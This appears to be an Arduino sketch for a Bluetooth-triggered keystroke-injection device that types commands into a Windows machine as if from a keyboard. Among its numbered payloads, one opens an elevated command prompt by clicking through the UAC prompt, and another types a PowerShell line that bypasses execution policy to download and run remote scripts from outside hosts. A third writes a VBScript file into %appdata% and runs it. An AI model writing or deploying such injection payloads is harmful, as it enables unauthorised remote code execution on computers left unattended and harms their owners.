void returnRelease(){
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
}

void runBox(){
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(100);
}

void openCmd(){
  runBox();
  Keyboard.print("cmd");
  returnRelease();
  delay(100);
}
void openCmdAsAdmin(){
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.releaseAll();
  delay(200);
  Keyboard.print("cmd");
  delay(300);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(400);
  Keyboard.press(KEY_LEFT_ARROW);
  Keyboard.releaseAll();
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(200);
}


void payload() {
  runBox();
  Keyboard.print("iexplore.exe https://www.youtube.com/watch?v=5j-sY41ru4M");
  returnRelease();
}

void payload2() {
  runBox();
  Keyboard.print("cmd");
  returnRelease();
  delay(100);
  Keyboard.print("copy con /Y %appdata%\\nokia.vbs");
  returnRelease();
  Keyboard.print("Set wshShell = CreateObject( \"WScript.Shell\" )");
  Keyboard.press(KEY_RETURN);
  Keyboard.print("");
  returnRelease();
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('c');
  Keyboard.releaseAll();
  Keyboard.print("exit");
  returnRelease();
  runBox();
  Keyboard.print("wscript.exe %appdata%\\nokia.vbs");
  returnRelease();
}
void payload3(){
  runBox();
  Keyboard.print("wscript.exe %appdata%\\nokia.vbs");
  returnRelease();
}
void payload4(){
  openCmdAsAdmin();
  Keyboard.print("@powershell -NoProfile -ExecutionPolicy Bypass -Command \"iex ((New-Object System.Net.WebClient).DownloadString('http://robertbarrett.com/files/helloworld.ps1'))\" && SET \"PATH=%PATH%;%ALLUSERSPROFILE%\chocolatey\bin\"@powershell -NoProfile -ExecutionPolicy Bypass -Command \"iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))\" && SET \"PATH=%PATH%;%ALLUSERSPROFILE%\chocolatey\bin\"");
  returnRelease();
}


void setup() {
  Serial3.begin (9600);
}

void loop() {
  char btRead;
  if (Serial3.available ()) {  
    btRead = Serial3.read();
    if(btRead == '1'){
       payload();
       Serial3.print("\r\nPayload 1 sent\r\n");
    }
    else if(btRead == '2'){
       payload2();
       Serial3.print("\r\nPayload 2 sent\r\n");
    }
    else if(btRead == '3'){
       payload3();
       Serial3.print("\r\nPayload 3 sent\r\n");
    }
    else if(btRead == '4'){
       payload4();
       Serial3.print("\r\nPayload 4 sent\r\n");
    }
    else if(btRead == '5'){
    }

    
  }
}
